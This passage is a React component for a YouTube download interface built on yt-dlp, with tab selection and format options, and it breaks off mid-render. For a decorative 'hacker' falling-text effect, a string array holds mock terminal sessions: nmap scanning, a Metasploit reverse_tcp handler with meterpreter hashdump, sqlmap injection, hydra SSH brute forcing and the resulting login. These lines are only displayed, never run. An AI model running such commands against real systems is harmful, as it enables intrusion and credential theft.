```jsx
import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Select, SelectTrigger, SelectContent, SelectItem, SelectValue } from "@/components/ui/select";
import { Progress } from "@/components/ui/progress";
import { Separator } from "@/components/ui/separator";
import { toast } from "sonner";
import { Checkbox } from "@/components/ui/checkbox";

const Index = () => {
  const [url, setUrl] = useState("");
  const [message, setMessage] = useState("");
  const [tabs, setTabs] = useState([]);
  const [selectedTab, setSelectedTab] = useState("");
  const [downloadHistory, setDownloadHistory] = useState([]);
  const [runningDownloads, setRunningDownloads] = useState([]);
  const [progress, setProgress] = useState(0);
  const [ytDlpConfig, setYtDlpConfig] = useState({
    format: "mp4",
    quality: "best",
    audioOnly: false,
  });

  const mutation = useMutation({
    mutationFn: async (url) => {
      const response = await fetch("http://localhost:80", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams({ 
          url,
          format: ytDlpConfig.format,
          quality: ytDlpConfig.quality,
          audioOnly: ytDlpConfig.audioOnly,
        }),
      });

      if (!response.ok) {
        throw new Error("Network response was not ok");
      }

      const data = await response.text();
      return data;
    },
    onSuccess: (data) => {
      setMessage(data);
      setDownloadHistory((prevHistory) => [...prevHistory, { url, data }]);
      setRunningDownloads((prevRunning) => prevRunning.filter((item) => item !== url));
      toast("Download complete!");
    },
    onError: (error) => {
      setMessage(`Error: ${error.message}`);
      setRunningDownloads((prevRunning) => prevRunning.filter((item) => item !== url));
      toast.error("Download failed!");
    },
  });

  const handleSubmit = (e) => {
    e.preventDefault();
    setRunningDownloads((prevRunning) => [...prevRunning, url]);
    mutation.mutate(url);
  };

  const handleTabSelect = (tabUrl) => {
    setSelectedTab(tabUrl);
    setRunningDownloads((prevRunning) => [...prevRunning, tabUrl]);
    mutation.mutate(tabUrl);
  };

  const handleConfigChange = (e) => {
    const { name, value, type, checked } = e.target;
    setYtDlpConfig((prevConfig) => ({
      ...prevConfig,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  useEffect(() => {
    // Mock chrome.tabs.query for development
    if (typeof chrome !== "undefined" && chrome.tabs) {
      chrome.tabs.query({ currentWindow: true, active: true }, (tabs) => {
        setTabs(tabs);
      });
    } else {
      // Mock data for development
      setTabs([
        { id: 1, url: "https://www.youtube.com/watch?v=example1", title: "Example Video 1" },
        { id: 2, url: "https://www.youtube.com/watch?v=example2", title: "Example Video 2" },
      ]);
    }
  }, []);

  useEffect(() => {
    if (mutation.isLoading) {
      const interval = setInterval(() => {
        setProgress((prevProgress) => (prevProgress >= 100 ? 0 : prevProgress + 10));
      }, 1000);
      return () => clearInterval(interval);
    } else {
      setProgress(0);
    }
  }, [mutation.isLoading]);

  useEffect(() => {
    // Add falling text effect with real Linux commands
    const commands = [
      "root@kali:~# nmap -sS -T4 -A -v 192.168.1.0/24",
      "Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-08 00:10 UTC",
      "Nmap scan report for 192.168.1.1",
      "Host is up (0.0012s latency).",
      "Not shown: 999 closed ports",
      "PORT   STATE SERVICE VERSION",
      "80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))",
      "|_http-server-header: Apache/2.4.41 (Ubuntu)",
      "|_http-title: Apache2 Ubuntu Default Page: It works",
      "Nmap scan report for 192.168.1.2",
      "Host is up (0.0011s latency).",
      "Not shown: 999 closed ports",
      "PORT   STATE SERVICE VERSION",
      "22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)",
      "| ssh-hostkey: ",
      "|   3072 d2:15:3f:87:45:45:9c:3d:24:56:e8:63:3e:0e:7a:cb (RSA)",
      "|   256 c2:58:bd:13:fa:69:7e:db:6e:c2:74:71:ef:48:7e:0b (ECDSA)",
      "|_  256 f4:ed:1a:34:8f:56:cc:16:67:5f:34:5d:3e:a5:0f:da (ED25519)",
      "Nmap done: 256 IP addresses (2 hosts up) scanned in 5.37 seconds",
      "root@kali:~# msfconsole",
      "Metasploit Park, System Security Interface",
      "Version 4.2.5, Alpha E",
      "Ready...",
      "> access security",
      "msf5 > use exploit/multi/handler",
      "msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp",
      "payload => windows/meterpreter/reverse_tcp",
      "msf5 exploit(multi/handler) > set lhost 192.168.1.5",
      "lhost => 192.168.1.5",
      "msf5 exploit(multi/handler) > set lport 4444",
      "lport => 4444",
      "msf5 exploit(multi/handler) > exploit",
      "[*] Started reverse TCP handler on 192.168.1.5:4444",
      "[*] Sending stage (179779 bytes) to 192.168.1.2",
      "[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.2:56278) at 2024-07-08 00:12:33 +0000",
      "meterpreter > sysinfo",
      "Computer        : 192.168.1.2",
      "OS              : Windows 10 (10.0 Build 19041).",
      "Architecture    : x64",
      "System Language : en_US",
      "Domain          : WORKGROUP",
      "Logged On Users : 1",
      "Meterpreter     : x64/windows",
      "meterpreter > hashdump",
      "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
      "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
      "John:1000:aad3b435b51404eeaad3b435b51404ee:8743b52063cd84097a65d1633f5c74f5:::",
      "meterpreter > exit",
      "[*] Shutting down Meterpreter...",
      "msf5 exploit(multi/handler) > exit",
      "root@kali:~# sqlmap -u \"http://192.168.1.1/vulnerable_page.php?id=1\" --dbs",
      "___",
      "__H__",
      "___[(]_____ ___ ___  {1.5.4#stable}",
      "|_ -| . [)]     | .'| . |",
      "|___|_  [)]_|_|_|__,|  _|",
      "      |_|V...       |_|   http://sqlmap.org",
      "[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws.",
      "[*] starting @ 00:15:10 /2024-07-08/",
      "[00:15:10] [INFO] testing connection to the target URL",
      "[00:15:11] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS",
      "[00:15:11] [INFO] testing if the target URL content is stable",
      "[00:15:12] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')",
      "[00:15:12] [INFO] testing for SQL injection on GET parameter 'id'",
      "[00:15:12] [INFO] confirming SQL injection on GET parameter 'id'",
      "[00:15:13] [INFO] the back-end DBMS is MySQL",
      "web server operating system: Linux Ubuntu",
      "web application technology: Apache 2.4.41",
      "back-end DBMS: MySQL >= 5.0",
      "[00:15:13] [INFO] fetching database names",
      "[00:15:13] [INFO] retrieved: 'information_schema'",
      "[00:15:13] [INFO] retrieved: 'vulnerable_db'",
      "available databases [2]:",
      "[*] information_schema",
      "[*] vulnerable_db",
      "[00:15:13] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.1'",
      "root@kali:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh",
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-08 00:16:20",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 1 server",
      "[DATA] attacking ssh://192.168.1.1:22/",
      "[22][ssh] host: 192.168.1.1   login: admin   password: admin123",
      "[STATUS] attack finished for 192.168.1.1 (valid pair found)",
      "1 of 1 target successfully completed, 1 valid password found",
      "root@kali:~# ssh admin@192.168.1.1",
      "The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established.",
      "ECDSA key fingerprint is SHA256:8p6Q2l9r3+4T5z6J5d6t7y8u9a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t.",
      "Are you sure you want to continue connecting (yes/no)? yes",
      "Warning: Permanently added '192.168.1.1' (ECDSA) to the list of known hosts.",
      "admin@192.168.1.1's password: ",
      "Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.8.0-50-generic x86_64)",
      "Last login: Mon Jul  8 00:17:33 2024 from 192.168.1.5",
      "admin@ubuntu:~$"
    ];

    const fallingTextContainer = document.createElement("div");
    fallingTextContainer.className = "falling-text";
    document.body.appendChild(fallingTextContainer);

    const createFallingText = () => {
      const span = document.createElement("span");
      span.textContent = commands[Math.floor(Math.random() * commands.length)];
      span.style.left = `${Math.random() * 100}vw`;
      span.style.animationDuration = `${Math.random() * 5 + 5}s`;
      fallingTextContainer.appendChild(span);

      setTimeout(() => {
        fallingTextContainer.removeChild(span);
      }, 10000);
    };

    const interval = setInterval(createFallingText, 500);

    return () => {
      clearInterval(interval);
      document.body.removeChild(fallingTextContainer);
    };
  }, []);

  useEffect(() => {
    // Add background image
    document.body.style.backgroundImage = "url('/images/musical-battlefield.png')";
    document.body.style.backgroundSize = "cover";
    document.body.style.backgroundRepeat = "no-repeat";

    return () => {
      document.body.style.backgroundImage = "";
    };
  }, []);

  return (
    <div className="flex flex-col items-center justify-center min-h-screen p-4 bg-transparent">
      <Card className="w-full max-w-md mb-4 text-center">
        <CardHeader>
          <CardTitle className="text-2xl font-bold">Download YouTube Videos</CardTitle>
          {mutation.isLoading && <Progress value={progress} />}
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <Label htmlFor="url" className="font-bold">YouTube URL</Label>
              <Input
                id="url"
                type="text"
                placeholder="Enter YouTube URL"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                required
              />
            </div>
            <Button type="submit" disabled={mutation.isLoading} className="w-full">
              {mutation.isLoading ? "Downloading..." : "Download"}
            </Button>
          </form>
          <div className="mt-4">
            <Label htmlFor="tabs" className="font-bold">Or select an active tab</Label>
            <Select onValueChange={handleTabSelect}>
              <SelectTrigger id="tabs" className="w-full">
                <SelectValue placeholder="Select a tab..." />
              </SelectTrigger>
              <SelectContent>
                {tabs.map((tab) => (
                  <SelectItem key={tab.id} value={tab.url}>
                    {tab.title}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <div className="mt-4">
            <Label className="font-bold">yt-dlp Configuration</Label>
            <div className="mb-2">
              <Label htmlFor="format" className="font-bold">Format</Label>
              <Select onValueChange={(value) => setYtDlpConfig((prevConfig) => ({ ...prevConfig, format: value }))}>
                <SelectTrigger id="format" className="w-full">
                  <SelectValue placeholder="Select format..." />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="mp4">MP4</SelectItem>
                  <SelectItem value="mkv">MKV</SelectItem>
                  <SelectItem value="webm">WEBM</SelectItem>
                  <SelectItem value="mp3">MP3</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div className="mb-2">
              <Label htmlFor="quality" className="font-bold">Quality</Label>
              <Select onValueChange={(value) => setYtDlpConfig((prevConfig) => ({ ...prevConfig, quality: value }))}>
                <SelectTrigger id="quality" className="w-full">
                  <SelectValue placeholder="Select quality..." />
                </SelectTrigger>
                <SelectContent>
                  {ytDlpConfig.audioOnly ? (
                    <>
                      <SelectItem value="128k">128 kbps</SelectItem>
                      <SelectItem value="192k">192 kbps</SelectItem>
                      <SelectItem value="256k">256 kbps</SelectItem>
                      <SelectItem value="320k">320 kbps</SelectItem>
                    </>
                  ) : (
                    <>
                      <SelectItem value="best">Best</SelectItem>
                      <SelectItem value="1080p">1080p</SelectItem>
                      <SelectItem value="720p">720p</SelectItem>
                      <SelectItem value="480p">480p</SelectItem>
                      <SelectItem value="360p">360p</SelectItem>
                    </>
                  )}
                </SelectContent>
              </Select>
            </div>
            <div className="mb-2">
              <Label htmlFor="audioOnly" className="font-bold">Audio Only</Label>
              <Checkbox
                className="w-4 h-4 text-black bg-opacity-50 checked:bg-red-500 checked:bg-opacity-50"
                checked={ytDlpConfig.audioOnly}
                onCheckedChange={(checked) => setYtDlpConfig((prevConfig) => ({
                  ...prevConfig,
                  audioOnly: checked,
                }))}
              >
                <span className="text-red-500">X</span>
              </Checkbox>
            </div>
          </div>
        </CardContent>
        <CardFooter>
          {message && <p className="font-bold">{message}</p>}
        </CardFooter>
      </Card>

      <Card className="w-full max-w-md mb-4 text-center">
        <CardHeader>
          <CardTitle className="text-2xl font-bold">Running Downloads</CardTitle>
        </CardHeader>
        <CardContent>
          <ul>
            {runningDownloads.map((download, index) => (
              <li key={index} className="font-bold">{download}</li>
            ))}
          </ul>
